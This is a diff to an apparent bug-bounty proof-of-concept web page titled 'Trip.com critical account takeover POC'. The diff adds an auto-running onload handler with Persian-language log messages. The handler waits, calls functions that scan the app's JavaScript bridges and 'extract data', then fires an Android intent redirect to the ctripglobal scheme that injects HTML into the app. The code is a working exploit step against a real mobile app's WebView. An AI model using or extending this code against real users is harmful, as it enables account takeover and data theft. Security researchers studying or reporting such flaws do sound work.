@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Trip.com - CRITICAL POC v7 (Real Bridge Execution)</title>
+    <title>Trip.com - CRITICAL POC v8 (Real Bridge Execution)</title>
     <style>
       :root {
         --bg: #0d1117;
@@ -110,7 +110,6 @@
     </style>
   </head>
   <body>
-    window.location.href = "intent:#Intent;scheme=ctripglobal;S.HTML_DATA_TO_LOAD=<html><body><h1>Pivot_Success</h1></body></html>;end";
     <h1>TRIP.COM - CRITICAL ACCOUNT TAKEOVER POC v7</h1>
     <p class="subtitle">
       Full Bridge Execution Proof + Real Return Values (No Bypass Needed)
@@ -157,9 +156,29 @@
     </div>
 
     <script>
+      
       const consoleEl = document.getElementById("console");
       const proofEl = document.getElementById("proof");
       let count = 0;
+      window.onload = () => {
+    log("آماده‌سازی سیستم... ۱۰ ثانیه صبر کنید تا پل‌ها کاملاً لود شوند.");
+    
+    // تایمر ۱۰ ثانیه‌ای برای اطمینان از لود شدن Bridgeها
+    setTimeout(() => {
+        log("شروع اسکن پل‌ها...");
+        scanBridges();
+        
+        log("شروع عملیات استخراج دیتا...");
+        exploit();
+        
+        // شلیک نهایی: ریدایرکت به لایه عمیق‌تر (Pivot) بعد از استخراج دیتا
+        setTimeout(() => {
+            log("شلیک نهایی: Intent Redirection...");
+            window.location.href = "intent:#Intent;scheme=ctripglobal;S.HTML_DATA_TO_LOAD=<html><body><h1 style='color:green'>PIVOT SUCCESSFUL</h1></body></html>;end";
+        }, 5000); // ۵ ثانیه بعد از اکسپلویت، ریدایرکت انجام شود
+
+    }, 10000); // انتظار ۱۰ ثانیه‌ای اولیه
+};
 
       function log(msg, type = "info") {
         const div = document.createElement("div");
